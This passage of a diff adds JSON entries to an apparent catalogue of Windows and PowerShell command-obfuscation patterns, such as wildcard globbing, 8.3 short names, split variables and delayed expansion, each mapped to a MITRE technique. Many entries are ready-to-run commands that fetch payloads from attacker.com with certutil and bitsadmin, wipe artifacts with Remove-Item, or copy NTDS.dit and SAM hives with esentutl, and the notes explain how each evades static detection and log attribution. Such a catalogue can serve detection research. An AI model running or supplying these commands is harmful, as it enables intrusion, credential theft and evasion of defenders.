+        "Pattern": "$w=New-Object Net.WebClient;$w.(($w.PsObject.Methods|?{$_.Name-clike'D*F*'}).Name).Invoke('http://...','C:\\out.exe')",
+        "Wildcards": [
+          "-clike"
+        ],
+        "Notes": "-clike 'D*F*' resolves DownloadFile method",
+        "Method": "DownloadFile"
+      },
+      {
+        "Pattern": "& (gcm ('{0}ew-{1}' -f 'N','Object')) Net.WebClient",
+        "Wildcards": [],
+        "Notes": "-f format operator constructs 'New-Object' from string fragments before gcm resolves it",
+        "Method": "-f format operator"
+      },
+      {
+        "Pattern": "& (gcm ('New'+'-Ob'+'ject')) Net.WebClient",
+        "Wildcards": [],
+        "Notes": "String concatenation builds the cmdlet name from three fragments \u2014 full name never appears contiguous in source",
+        "Method": "String concatenation"
+      },
+      {
+        "Pattern": "& (gcm N[d-f]w-Object) Net.WebClient",
+        "Wildcards": [
+          "[d-f]"
+        ],
+        "Notes": "Character range [d-f] matches 'e' in New \u2014 only character in range that satisfies New-Object"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1105/",
+      "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object",
+      "https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38"
+    ]
+  },
+  {
+    "Name": "Out-File",
+    "Description": "Send pipeline output to a file. Alternative to Set-Content with pipeline support \u2014 used to write payloads, scripts, or exfiltrated data to disk.",
+    "Platform": "powershell",
+    "BinaryPath": [
+      "PowerShell cmdlet"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059.001",
+    "Patterns": [
+      {
+        "Pattern": "& (gcm O*-F*) -FilePath C:\\out.txt",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcards on both verb and noun"
+      },
+      {
+        "Pattern": "& (gcm Out-Fil*) -FilePath C:\\out.txt",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star suffix matches 'e'"
+      },
+      {
+        "Pattern": "& (gcm O?t-File) -FilePath C:\\out.txt",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 'u'"
+      },
+      {
+        "Pattern": "& (gcm *-File) -FilePath C:\\out.txt",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Prefix wildcard \u2014 add -CommandType Cmdlet to avoid matching aliases"
+      },
+      {
+        "Pattern": "'payload' | & (gcm O*-F*) -FilePath C:\\payload.ps1",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Pipeline form \u2014 writes string to file via glob-resolved Out-File"
+      },
+      {
+        "Pattern": "& (gcm O[t-v]t-File) -FilePath C:\\out.txt",
+        "Wildcards": [
+          "[t-v]"
+        ],
+        "Notes": "Character range [t-v] matches 'u' in Out \u2014 only character in range that satisfies Out-File"
+      },
+      {
+        "Pattern": "& (gcm ('{0}ut-{1}' -f 'O','File')) -FilePath C:\\out.txt",
+        "Wildcards": [],
+        "Notes": "-f format operator constructs 'Out-File' from string fragments before gcm resolves it",
+        "Method": "-f format operator"
+      }
+    ],
+    "PlatformNotes": "Out-File writes pipeline output to a file. Key differences from Set-Content: accepts pipeline input directly, uses the console encoding by default, and supports `-Append`. The `-Encoding` parameter controls output encoding. Useful for writing scripts to disk: `'IEX ...' | Out-File payload.ps1`.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/001/",
+      "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/out-file"
+    ]
+  },
+  {
+    "Name": "Remove-Item",
+    "Description": "Delete files, directories, registry keys, or other PowerShell provider items. Used for log wiping, artifact cleanup, and indicator removal.",
+    "Platform": "powershell",
+    "BinaryPath": [
+      "PowerShell cmdlet"
+    ],
+    "Category": "execution",
+    "MitreID": "T1070.004",
+    "Patterns": [
+      {
+        "Pattern": "& (gcm R*-It*) -Path C:\\Windows\\Temp\\* -Recurse -Force",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcards on both verb and noun"
+      },
+      {
+        "Pattern": "& (gcm Remove-I*) -Path C:\\artifact.log -Force",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star suffix matches 'tem'"
+      },
+      {
+        "Pattern": "& (gcm R?move-Item) -Path ...",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 'e'"
+      },
+      {
+        "Pattern": "& (gcm *-Item) -Path ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Prefix wildcard \u2014 note: may match other *-Item cmdlets; add -CommandType Cmdlet to disambiguate"
+      },
+      {
+        "Pattern": "rm -Path C:\\artifact.log",
+        "Wildcards": [],
+        "Notes": "Built-in alias 'rm' for Remove-Item"
+      },
+      {
+        "Pattern": "del -Path C:\\artifact.log",
+        "Wildcards": [],
+        "Notes": "Alias 'del' for Remove-Item"
+      },
+      {
+        "Pattern": "ri -Path C:\\artifact.log",
+        "Wildcards": [],
+        "Notes": "Alias 'ri' for Remove-Item"
+      },
+      {
+        "Pattern": "& (gal r?) -Path ...",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Get-Alias r? \u2014 resolves 'rm' or 'ri' depending on match; 'ri' is the shorter alias"
+      },
+      {
+        "Pattern": "& (gcm R[d-f]move-Item) -Path C:\\artifact.log -Force",
+        "Wildcards": [
+          "[d-f]"
+        ],
+        "Notes": "Character range [d-f] matches 'e' in Remove \u2014 only character in range that satisfies Remove-Item"
+      },
+      {
+        "Pattern": "& (DIR Alias:/r?) -Path C:\\artifact.log",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Resolves rm/ri alias via PowerShell's Alias: PSDrive glob \u2014 filesystem-style wildcard on the Alias provider"
+      },
+      {
+        "Pattern": "& (gcm * | ? Name -match '^Rem.*It') -Path C:\\artifact.log -Force",
+        "Wildcards": [
+          "-match"
+        ],
+        "Notes": "Regex -match filter on all commands via Where-Object pipeline \u2014 regex alternative to glob wildcards"
+      },
+      {
+        "Pattern": "& (gcm ('{0}move-{1}' -f 'Re','Item')) -Path C:\\artifact.log -Force",
+        "Wildcards": [],
+        "Notes": "-f format operator constructs 'Remove-Item' from string fragments before gcm resolves it",
+        "Method": "-f format operator"
+      }
+    ],
+    "PlatformNotes": "`rm`, `del`, and `ri` are built-in aliases. Remove-Item with `-Recurse -Force` silently deletes entire trees. Targets PowerShell providers beyond the filesystem: `Remove-Item HKLM:\\SOFTWARE\\...` operates on the registry, `Remove-Item Env:\\VAR` deletes environment variables.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1070/004/",
+      "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/remove-item"
+    ]
+  },
+  {
+    "Name": "Set-Content",
+    "Description": "Write content to a file. Used to drop payloads, modify system files, or write scripts to disk for execution.",
+    "Platform": "powershell",
+    "BinaryPath": [
+      "PowerShell cmdlet"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059.001",
+    "Patterns": [
+      {
+        "Pattern": "& (gcm S*-C*t) -Path C:\\payload.ps1 -Value $code",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcards in both verb and noun"
+      },
+      {
+        "Pattern": "& (gcm Set-Con*) -Path ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'tent'"
+      },
+      {
+        "Pattern": "& (gcm S?t-Content) -Path ...",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 'e'"
+      },
+      {
+        "Pattern": "& (gcm S[d-f]t-Content) -Path ...",
+        "Wildcards": [
+          "[d-f]"
+        ],
+        "Notes": "Character range matches 'e' in Set"
+      },
+      {
+        "Pattern": "& (gcm *-Content) -Path ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Prefix wildcard \u2014 note: also matches Get-Content"
+      },
+      {
+        "Pattern": "sc -Path C:\\file.txt -Value 'data'",
+        "Wildcards": [],
+        "Notes": "Alias 'sc' (note: conflicts with sc.exe service control)"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/001/",
+      "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-content"
+    ]
+  },
+  {
+    "Name": "Start-Process",
+    "Description": "Start one or more processes. Can launch executables with specific arguments, working directories, and window styles.",
+    "Platform": "powershell",
+    "BinaryPath": [
+      "PowerShell cmdlet"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059.001",
+    "Patterns": [
+      {
+        "Pattern": "& (gcm S*a*-P*ess) -FilePath cmd.exe",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcards in verb and noun"
+      },
+      {
+        "Pattern": "& (gcm Start-Pro*) -FilePath ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'cess'"
+      },
+      {
+        "Pattern": "& (gcm S?art-Process) -FilePath ...",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 't'"
+      },
+      {
+        "Pattern": "& (gcm S[s-u]art-Process) -FilePath ...",
+        "Wildcards": [
+          "[s-u]"
+        ],
+        "Notes": "Character range matches 't' in Start"
+      },
+      {
+        "Pattern": "& (gcm *-Process) -FilePath ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Prefix wildcard"
+      },
+      {
+        "Pattern": "saps -FilePath cmd.exe",
+        "Wildcards": [],
+        "Notes": "Built-in alias 'saps' for Start-Process"
+      },
+      {
+        "Pattern": "start cmd.exe",
+        "Wildcards": [],
+        "Notes": "Alias 'start' for Start-Process"
+      },
+      {
+        "Pattern": "& (gal sa?s) cmd.exe",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Get-Alias with wildcard resolves 'saps' \u2014 sa?s avoids matching 'spps' (Stop-Process)"
+      },
+      {
+        "Pattern": "& (gcm *rocess) cmd.exe",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Short suffix pattern"
+      },
+      {
+        "Pattern": "& (gcm Start-Pro*) (Resolve-Path C:\\Win*\\Sys*32\\cmd.exe)",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Double glob \u2014 gcm wildcard resolves Start-Process AND Resolve-Path filesystem glob resolves the binary path to cmd.exe"
+      },
+      {
+        "Pattern": "& (DIR Alias:/sa?s) cmd.exe",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Resolves saps alias via PowerShell's Alias: PSDrive glob \u2014 sa?s matches saps (Start-Process)"
+      },
+      {
+        "Pattern": "& (gcm * | ? Name -match '^St.*Pro') -FilePath cmd.exe",
+        "Wildcards": [
+          "-match"
+        ],
+        "Notes": "Regex -match filter on all commands via Where-Object pipeline \u2014 regex alternative to glob wildcards"
+      },
+      {
+        "Pattern": "& (gcm ('{0}-{1}' -f 'Start','Process')) -FilePath cmd.exe",
+        "Wildcards": [],
+        "Notes": "-f format operator constructs 'Start-Process' from string fragments before gcm resolves it",
+        "Method": "-f format operator"
+      },
+      {
+        "Pattern": "& (Get-Command -Verb Start* -Noun *Process) -FilePath cmd.exe",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Get-Command -Verb/-Noun structured split \u2014 wildcards on verb and noun independently narrow the match to Start-Process",
+        "Method": "Get-Command -Verb -Noun"
+      },
+      {
+        "Pattern": "& ($ExecutionContext.InvokeCommand.GetCommand('Start-Pro*','Cmdlet')) -FilePath cmd.exe",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Engine-level cmdlet resolution via InvokeCommand.GetCommand \u2014 bypasses Get-Command entirely; Start-Pro* resolves to Start-Process",
+        "Method": "ExecutionContext resolution"
+      },
+      {
+        "Pattern": "& (gcm ('Start'+'-Pro'+'cess')) -FilePath cmd.exe",
+        "Wildcards": [],
+        "Notes": "String concatenation builds the cmdlet name from three fragments \u2014 full name never appears contiguous in source",
+        "Method": "String concatenation"
+      },
+      {
+        "Pattern": "$c = gcm Start-Pro*; & $c -FilePath cmd.exe",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Variable-based invocation \u2014 glob resolves to Start-Process at assignment time; & invokes the stored CommandInfo object",
+        "Method": "Variable invocation"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/001/",
+      "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process"
+    ]
+  },
+  {
+    "Name": "Test-Connection",
+    "Description": "Send ICMP echo requests (ping). Used for host discovery and network reconnaissance within PowerShell scripts.",
+    "Platform": "powershell",
+    "BinaryPath": [
+      "PowerShell cmdlet"
+    ],
+    "Category": "reconnaissance",
+    "MitreID": "T1018",
+    "Patterns": [
+      {
+        "Pattern": "& (gcm T*-C*n) -ComputerName 192.168.1.1",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcards in both verb and noun"
+      },
+      {
+        "Pattern": "& (gcm Test-Con*) -ComputerName ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'nection'"
+      },
+      {
+        "Pattern": "& (gcm T?st-Connection) -ComputerName ...",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 'e'"
+      },
+      {
+        "Pattern": "& (gcm T[d-f]st-Connection) -ComputerName ...",
+        "Wildcards": [
+          "[d-f]"
+        ],
+        "Notes": "Character range matches 'e' in Test"
+      },
+      {
+        "Pattern": "& (gcm *Connection) -ComputerName ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Prefix wildcard"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1018/",
+      "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/test-connection"
+    ]
+  },
+  {
+    "Name": "bitsadmin",
+    "Description": "Background Intelligent Transfer Service admin tool. Can download or upload files using BITS jobs, bypassing some network controls.",
+    "Platform": "windows-cmd",
+    "BinaryPath": [
+      "C:\\Windows\\System32\\bitsadmin.exe"
+    ],
+    "Category": "download",
+    "MitreID": "T1197",
+    "Patterns": [
+      {
+        "Pattern": "for /f %i in ('where bits*.exe') do %i /transfer job /download /priority normal http://attacker.com/p.exe C:\\p.exe",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'admin' after 'bits'"
+      },
+      {
+        "Pattern": "for /f %i in ('where b*admin.exe') do %i",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star replaces 'its'"
+      },
+      {
+        "Pattern": "for /f %i in ('where bitsad?in.exe') do %i",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 'm'"
+      },
+      {
+        "Pattern": "for /f %i in ('dir /b C:\\Windows\\System32\\bits*.exe') do %i",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "dir /b with glob pattern"
+      },
+      {
+        "Pattern": "forfiles /p C:\\Windows\\System32 /m bits*.exe /c \"@file /transfer job /download /priority normal http://attacker.com/p.exe C:\\p.exe\"",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "forfiles * mask finds bitsadmin.exe \u2014 @file expands to matched filename for execution"
+      },
+      {
+        "Pattern": "C:\\Windows\\System32\\BITSAD~1.EXE /transfer job /download /priority normal http://attacker.com/p.exe C:\\p.exe",
+        "Wildcards": [],
+        "Notes": "8.3 SFN \u2014 requires NtfsDisable8dot3NameCreation=0; BITSAD~1 is the auto-generated short name for bitsadmin.exe"
+      },
+      {
+        "Pattern": "for %i in (C:\\Windows\\System32\\bits*.exe) do @%i /transfer job /download /priority normal http://attacker.com/p.exe C:\\p.exe",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Native CMD for loop with filesystem glob \u2014 expands bits*.exe directly in System32 without where.exe",
+        "Method": "Simple for glob"
+      },
+      {
+        "Pattern": "for /f %i in ('where /r C:\\Windows bits*.exe') do %i /transfer job /download /priority normal http://attacker.com/p.exe C:\\p.exe",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Recursive where search across Windows tree \u2014 finds bitsadmin.exe regardless of System32 vs SysWOW64 location",
+        "Method": "where /r recursive"
+      },
+      {
+        "Pattern": "set a=bits& set b=admin& call %a%%b% /transfer job /download /priority normal http://attacker.com/p.exe C:\\p.exe",
+        "Wildcards": [],
+        "Notes": "Binary name split across two SET variables \u2014 CALL resolves %a%%b%=bitsadmin; name never appears as literal string",
+        "Method": "set variable building"
+      },
+      {
+        "Pattern": "cmd /c for /f %i in ('where bits*.exe') do %i /transfer job /download /priority normal http://attacker.com/p.exe C:\\p.exe",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "cmd /c wrapper adds an extra process layer \u2014 glob still resolves via where; parent process becomes cmd.exe not the caller",
+        "Method": "cmd /c indirection"
+      }
+    ],
+    "PlatformNotes": "CMD glob evasion requires the `for /f` + `where` pattern. BITS jobs persist across reboots by default, making bitsadmin useful for persistence too.\n\n**8.3 SFN note**: Short filename paths (BITSAD~1.EXE) only exist when 8.3 name generation is enabled (`NtfsDisable8dot3NameCreation=0` in the registry).\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1197/",
+      "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/"
+    ]
+  },
+  {
+    "Name": "certutil",
+    "Description": "Certificate management utility. Widely abused for base64 encoding/decoding and downloading files from the internet.",
+    "Platform": "windows-cmd",
+    "BinaryPath": [
+      "C:\\Windows\\System32\\certutil.exe"
+    ],
+    "Category": "download",
+    "MitreID": "T1105",
+    "Patterns": [
+      {
+        "Pattern": "for /f %i in ('where c*til.exe') do %i -urlcache -split -f http://attacker.com/payload.exe C:\\payload.exe",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "CMD requires 'where' + for loop since glob doesn't work in command position. Star matches 'er' + 'u'"
+      },
+      {
+        "Pattern": "for /f %i in ('where cert?til.exe') do %i",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard in where query"
+      },
+      {
+        "Pattern": "for /f %i in ('where certutil*') do %i",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Trailing star matches '.exe' and variant names"
+      },
+      {
+        "Pattern": "cmd /c for /f %i in ('dir /b C:\\Windows\\System32\\cert*.exe') do %i",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Using dir /b with glob to find binary"
+      },
+      {
+        "Pattern": "for /f %i in ('where /r C:\\Windows c*til.exe') do %i",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Recursive where search with wildcard"
+      },
+      {
+        "Pattern": "forfiles /p C:\\Windows\\System32 /m certu*.exe /c \"cmd /c @file -urlcache -split -f http://attacker.com/p.exe C:\\p.exe\"",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "forfiles /m with certu* uniquely matches certutil.exe in System32 \u2014 @file expands to matched filename"
+      },
+      {
+        "Pattern": "C:\\Windows\\System32\\CERTUT~1.EXE -urlcache -split -f http://attacker.com/p.exe C:\\p.exe",
+        "Wildcards": [],
+        "Notes": "8.3 short filename (SFN) \u2014 requires 8.3 name generation enabled (NtfsDisable8dot3NameCreation=0); CERTUT~1 is auto-generated for certutil.exe"
+      },
+      {
+        "Pattern": "for %i in (C:\\Windows\\System32\\cert*.exe) do @%i -urlcache -split -f http://attacker.com/payload.exe C:\\payload.exe",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Native CMD for loop with filesystem glob \u2014 expands cert*.exe directly in System32 without requiring where.exe as an intermediary",
+        "Method": "Simple for glob"
+      },
+      {
+        "Pattern": "set a=cert& set b=util& call %a%%b% -urlcache -split -f http://attacker.com/p.exe C:\\p.exe",
+        "Wildcards": [],
+        "Notes": "Binary name split across two SET variables \u2014 CALL invokes the concatenated %a%%b%=certutil; full name never appears as a literal string",
+        "Method": "set variable building"
+      },
+      {
+        "Pattern": "cmd /v:on /c \"set x=certutil& !x! -urlcache -split -f http://attacker.com/p.exe C:\\p.exe\"",
+        "Wildcards": [],
+        "Notes": "Delayed variable expansion \u2014 /v:on enables !var! syntax; !x! resolves at runtime only, invisible to parse-time static analysis",
+        "Method": "Delayed expansion"
+      },
+      {
+        "Pattern": "for /f %i in ('where cert*.exe') do start \"\" /b %i -urlcache -split -f http://attacker.com/p.exe C:\\p.exe",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "start /b launches the resolved binary as a detached background process \u2014 changes parent process attribution in event logs",
+        "Method": "start indirection"
+      }
+    ],
+    "PlatformNotes": "**CMD does not expand glob wildcards in the command position.** Unlike bash, typing `c*rtutil` will not work directly in CMD. Instead, use:\n- `for /f %i in ('where c*til.exe') do @%i [args]` \u2014 resolves via where.exe\n- `for /f %i in ('dir /b C:\\Windows\\System32\\cert*.exe') do @%i` \u2014 resolves via dir\n\n**8.3 SFN note**: Short filename paths (CERTUT~1.EXE) require `NtfsDisable8dot3NameCreation=0` in the registry. On systems where 8.3 generation is disabled, these paths do not exist.\n\nIn batch scripts, use `%%i` instead of `%i`.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1105/",
+      "https://lolbas-project.github.io/lolbas/Binaries/Certutil/"
+    ]
+  },
+  {
+    "Name": "cmd",
+    "Description": "Windows Command Processor. Spawning cmd.exe is a common technique for executing commands, creating shells, and chaining operations.",
+    "Platform": "windows-cmd",
+    "BinaryPath": [
+      "C:\\Windows\\System32\\cmd.exe",
+      "C:\\Windows\\SysWOW64\\cmd.exe"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059.003",
+    "Patterns": [
+      {
+        "Pattern": "for /f %i in ('where cm?.exe') do %i /c whoami",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'd' \u2014 note: may also match cmp.exe if GNU tools are in PATH; prefer forfiles /p to scope to System32"
+      },
+      {
+        "Pattern": "for /f %i in ('where c*d.exe') do %i",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'm'"
+      },
+      {
+        "Pattern": "for /f %i in ('dir /b C:\\Windows\\System32\\cm?.exe') do %i",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "dir glob search with wildcard"
+      },
+      {
+        "Pattern": "%COMSPEC%",
+        "Wildcards": [],
+        "Notes": "Environment variable resolves to cmd.exe path \u2014 not a glob but a common evasion"
+      },
+      {
+        "Pattern": "for /f %i in ('where cmd*') do %i /c ...",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star suffix matches cmd.exe"
+      },
+      {
+        "Pattern": "forfiles /p C:\\Windows\\System32 /m cm?.exe /c \"@file /c whoami\"",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "forfiles ? wildcard in /m mask finds cmd.exe \u2014 @file expands to matched filename"
+      },
+      {
+        "Pattern": "C:\\WINDOW~1\\System32\\cmd.exe /c whoami",
+        "Wildcards": [],
+        "Notes": "8.3 SFN for the Windows directory \u2014 WINDOW~1 resolves to Windows; requires NtfsDisable8dot3NameCreation=0"
+      },
+      {
+        "Pattern": "%SystemRoot%\\System32\\%COMSPEC:~-7%",
+        "Wildcards": [],
+        "Notes": "Substring extraction \u2014 %COMSPEC% is the full path to cmd.exe; :~-7 extracts last 7 chars ('cmd.exe'), combined with %SystemRoot% to form full path"
+      },
+      {
+        "Pattern": "for %i in (C:\\Windows\\System32\\cm?.exe) do @%i /c whoami",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Native CMD for loop with filesystem glob \u2014 cm? expands to cmd.exe directly in System32",
+        "Method": "Simple for glob"
+      },
+      {
+        "Pattern": "for /f %i in ('where /r C:\\Windows cm?.exe') do %i /c whoami",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Recursive where search across Windows tree \u2014 finds cmd.exe in System32 and SysWOW64",
+        "Method": "where /r recursive"
+      },
+      {
+        "Pattern": "set a=cm& set b=d& call %a%%b%.exe /c whoami",
+        "Wildcards": [],
+        "Notes": "Binary name split across two SET variables \u2014 CALL resolves %a%%b%.exe=cmd.exe; name never appears as a literal string",
+        "Method": "set variable building"
+      },
+      {
+        "Pattern": "cmd /v:on /c \"set x=cmd& !x! /c whoami\"",
+        "Wildcards": [],
+        "Notes": "Delayed variable expansion \u2014 /v:on enables !var! syntax; !x! resolves at runtime, evading parse-time static analysis",
+        "Method": "Delayed expansion"
+      },
+      {
+        "Pattern": "for /f %i in ('where cm?.exe') do start \"\" /b %i /c whoami",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "start /b launches resolved cmd.exe as a background process \u2014 changes parent process attribution in event logs",
+        "Method": "start indirection"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/003/",
+      "https://lolbas-project.github.io/lolbas/Binaries/Cmd/"
+    ]
+  },
+  {
+    "Name": "cscript",
+    "Description": "Windows Script Host console runner for JScript and VBScript. Executes script files from disk or UNC paths.",
+    "Platform": "windows-cmd",
+    "BinaryPath": [
+      "C:\\Windows\\System32\\cscript.exe",
+      "C:\\Windows\\SysWOW64\\cscript.exe"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059.005",
+    "Patterns": [
+      {
+        "Pattern": "for /f %i in ('where cs?ript.exe') do %i script.vbs",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 'c' \u2014 cs?ript matches cscript"
+      },
+      {
+        "Pattern": "for /f %i in ('where c*ript.exe') do %i script.vbs",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 's' after 'c' and before 'ript'"
+      },
+      {
+        "Pattern": "for /f %i in ('where csc*.exe') do %i script.vbs",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star suffix matches 'ript.exe'"
+      },
+      {
+        "Pattern": "for /f %i in ('dir /b C:\\Windows\\System32\\csc*.exe') do %i script.vbs",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "dir /b glob finds cscript.exe in System32"
+      },
+      {
+        "Pattern": "forfiles /p C:\\Windows\\System32 /m cs?ript.exe /c \"@file script.vbs\"",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "forfiles ? wildcard in mask finds cscript.exe \u2014 @file expands to matched filename"
+      },
+      {
+        "Pattern": "C:\\Windows\\System32\\CSCRIP~1.EXE script.vbs",
+        "Wildcards": [],
+        "Notes": "8.3 SFN \u2014 CSCRIP~1 auto-generated for cscript.exe; requires NtfsDisable8dot3NameCreation=0"
+      },
+      {
+        "Pattern": "for %i in (C:\\Windows\\System32\\csc*.exe) do @%i script.vbs",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Native CMD for loop with filesystem glob \u2014 expands csc*.exe directly in System32 without where.exe",
+        "Method": "Simple for glob"
+      },
+      {
+        "Pattern": "for /f %i in ('where /r C:\\Windows csc*.exe') do %i script.vbs",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Recursive where search across Windows tree \u2014 finds cscript.exe in System32 and SysWOW64",
+        "Method": "where /r recursive"
+      },
+      {
+        "Pattern": "cmd /v:on /c \"set x=cscript& !x! script.vbs\"",
+        "Wildcards": [],
+        "Notes": "Delayed variable expansion \u2014 /v:on enables !var! syntax; !x! resolves at runtime only, invisible to parse-time static analysis",
+        "Method": "Delayed expansion"
+      }
+    ],
+    "PlatformNotes": "cscript.exe runs scripts with console output. wscript.exe is the GUI counterpart. Both are commonly flagged; glob obfuscation on the binary name via `where` or `forfiles` bypasses some string-based detections.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/005/",
+      "https://lolbas-project.github.io/lolbas/Binaries/Cscript/"
+    ]
+  },
+  {
+    "Name": "esentutl",
+    "Description": "Extensible Storage Engine utility. Can copy locked or in-use files (e.g., NTDS.dit, SAM) and is used for credential access and file staging.",
+    "Platform": "windows-cmd",
+    "BinaryPath": [
+      "C:\\Windows\\System32\\esentutl.exe"
+    ],
+    "Category": "download",
+    "MitreID": "T1105",
+    "Patterns": [
+      {
+        "Pattern": "for /f %i in ('where esen*.exe') do %i /y source.edb destination.edb",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'tutl' after 'esen'"
+      },
+      {
+        "Pattern": "for /f %i in ('where esentut?.exe') do %i /y source.edb dest.edb",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 'l'"
+      },
+      {
+        "Pattern": "for /f %i in ('where e*tl.exe') do %i /y source.edb dest.edb",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'sen' + 'tu' between 'e' and 'tl'"
+      },
+      {
+        "Pattern": "for /f %i in ('dir /b C:\\Windows\\System32\\esen*.exe') do %i /y src dest",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "dir /b glob finds esentutl.exe in System32"
+      },
+      {
+        "Pattern": "forfiles /p C:\\Windows\\System32 /m esen*.exe /c \"@file /y source dest\"",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "forfiles * mask finds esentutl.exe \u2014 @file expands to matched filename"
+      },
+      {
+        "Pattern": "for %i in (C:\\Windows\\System32\\esen*.exe) do @%i /y source.edb dest.edb",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Native CMD for loop with filesystem glob \u2014 expands esen*.exe directly in System32 without where.exe",
+        "Method": "Simple for glob"
+      },
+      {
+        "Pattern": "for /f %i in ('where /r C:\\Windows\\System32 esen*.exe') do %i /y source.edb dest.edb",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Recursive where search scoped to System32 \u2014 finds esentutl.exe without full path knowledge",
+        "Method": "where /r recursive"
+      },
+      {
+        "Pattern": "C:\\Windows\\System32\\ESENTU~1.EXE /y source.edb dest.edb",
+        "Wildcards": [],
+        "Notes": "8.3 SFN \u2014 ESENTU~1 auto-generated for esentutl.exe; requires NtfsDisable8dot3NameCreation=0"
+      }
+    ],
+    "PlatformNotes": "esentutl.exe can copy files that are locked by the OS (using VSS or direct ESE access). This makes it useful for extracting credential stores like `NTDS.dit` or the SAM hive. The `/y` flag copies a file, `/vss` accesses via Volume Shadow Copy. In batch scripts use `%%i` instead of `%i`.\n",
+    "Resources": [
